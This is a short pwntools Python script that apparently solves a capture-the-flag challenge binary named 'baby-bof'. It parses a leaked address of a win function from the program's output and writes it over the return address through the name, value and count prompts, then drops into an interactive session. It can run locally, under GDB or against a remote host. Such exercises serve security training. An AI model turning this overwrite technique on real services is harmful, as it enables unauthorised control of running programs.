from pwn import *
import re

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./baby-bof"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

win_address = int(re.search(b"0x[0-9a-f]+",io.recvline()).group(0),16) # Get win address from the output
io.info("win_address: " + hex(win_address))

io.sendlineafter(b"name:",b"a")                       # Send name
io.sendlineafter(b"value:",hex(win_address).encode()) # Send win address as value
io.sendlineafter(b"count:", b"4")                     # Send count to trigger win function overwriting return address, 4 is the offset to return address

io.interactive()